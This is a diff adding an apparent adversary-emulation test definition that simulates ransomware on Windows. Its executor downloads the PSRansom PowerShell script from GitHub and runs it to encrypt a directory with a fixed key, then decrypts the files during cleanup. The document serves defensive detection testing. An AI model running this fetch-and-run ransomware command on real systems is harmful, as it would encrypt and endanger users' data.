@@ -1,0 +1,33 @@
+attack_technique: PSRansom
+display_name: 'Simulate ransomware using PSRansom'
+atomic_tests:
+- name: Running PSRansom
+  auto_generated_guid: f92a474f-ced9-491f-b338-95a101418ce2
+  description: |
+    Download PSRansom and run it to encrypt content of directory
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_path:
+      description: location to save file 
+      type: string
+      default: $env:public\PSRansom.ps1
+    file_url:
+      description: URL to download the file
+      type: string
+      default: https://raw.githubusercontent.com/HakkYahud/PSRansom/main/PSRansom.ps1
+    victim_directory:
+      description: Directory to encrypt
+      type: string
+      default: C:\Users\I241001\AppData\Local\security.df6\
+  executor:
+    command: |
+      (New-Object System.Net.WebClient).DownloadFile("#{file_url}", "#{file_path}")
+      powershell "#{file_path}" -e "#{victim_directory}" -k "TehtrisKey007!"
+    cleanup_command:
+      $psrk = Get-Content -Path $env:public\recoverykey.txt;
+      Write-Host "[+] Recovery key:\ $psrk";
+      powershell "#{file_path}" -d "#{victim_directory}" -k $psrk;
+      Remove-Item $env:public\recoverykey.txt;
+      Remove-Item "#{file_path}"
+    name: powershell
